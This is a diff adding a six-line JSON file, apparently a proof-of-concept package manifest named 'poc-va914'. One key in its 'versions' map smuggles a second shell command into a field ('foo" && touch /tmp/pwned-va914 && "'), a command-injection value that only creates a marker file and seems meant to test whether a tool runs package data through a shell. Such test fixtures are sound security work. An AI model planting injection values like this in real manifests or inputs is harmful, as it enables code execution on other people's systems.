@@ -1,0 +1,6 @@
+{
+  "name": "poc-va914",
+  "versions": {
+    "foo\" && touch /tmp/pwned-va914 && \"": "1.0.0"
+  }
+}
